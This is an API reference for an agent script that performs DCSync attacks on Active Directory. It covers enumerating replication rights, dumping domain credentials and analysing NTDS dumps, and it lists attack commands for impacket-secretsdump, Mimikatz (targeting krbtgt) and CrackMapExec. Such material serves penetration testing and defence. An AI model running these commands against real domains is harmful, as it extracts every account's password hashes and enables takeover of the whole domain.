<!-- Copyright (c) 2026 defconxt. All rights reserved. -->
<!-- Licensed under AGPL-3.0 — see LICENSE file for details. -->
<!-- CIPHER is a trademark of defconxt. -->
# performing-dcsync-attack — API Reference

## Agent Script

| Command | Description |
|---------|-------------|
| `enumerate --domain <fqdn> --dc-ip <ip>` | Find principals with replication rights |
| `dcsync --domain <fqdn> --dc-ip <ip> [--target-user <user>]` | Execute DCSync attack |
| `analyze --domain <fqdn> --ntds-file <path>` | Analyze NTDS dump results |

## Parameters

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `--domain` | string | Yes | Target AD domain FQDN |
| `--dc-ip` | string | Yes | Domain controller IP address |
| `--target-user` | string | No | Specific user to DCSync (default: all) |
| `--ntds-file` | string | Yes (analyze) | Path to NTDS dump file |

## External Tool Reference

| Tool | Command | Purpose |
|------|---------|---------|
| Impacket | `impacket-secretsdump -just-dc domain/user@dc` | DCSync via MS-DRSR |
| Mimikatz | `lsadump::dcsync /domain:x /user:krbtgt` | Windows DCSync |
| CrackMapExec | `crackmapexec ldap -M daclread -o RIGHTS=DCSync` | Enumerate replication rights |
